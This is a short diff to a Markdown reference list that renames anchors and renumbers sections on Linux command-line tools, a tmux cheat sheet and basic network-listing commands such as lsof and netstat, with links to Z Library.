 1. [Z Library](https://singlelogin.me)/[Z Library on TOR](http://bookszlibb74ugqojhzhg2a63w5i2atv5bqarulgczawnbmsb6s6qead.onion/)
 
-<a id="cool-anchor"></a>
-**12.iii. Cool Linux commands**
+<a id="cool-linux-commands"></a>
+**12.ii. Cool Linux commands**
 
 1. https://jvns.ca/blog/2022/04/12/a-list-of-new-ish--command-line-tools/
 1. https://github.com/ibraheemdev/modern-unix
 
-
-
-<a id="tmux-anchor"></a>
-**12.iv. tmux**
+<a id="tmux"></a>
+**12.iii. tmux**
 
 | | Tmux Cheat Sheet |
 | --- | --- |
@@ -1092,8 +1096,8 @@ Mindmaps & Knowledge
 | Logging | ```Ctrl+b``` + ```Shift + P``` to start and stop. |
 | Menu | ```Ctrl+b``` + ```>```. Then use ```Ctrl+b``` + ```UP```, ```DOWN```, ```LEFT``` or ```RIGHT``` to move between the panes. |
 
-<a id="useful-anchor"></a>
-**12.v. Useful commands**
+<a id="useful-commands"></a>
+**12.iv. Useful commands**
 
 Use ```lsof -Pni``` or ```netstat -antpu``` (or ```ss -antpu```) to list all Internet (_-tu_) connections.
 
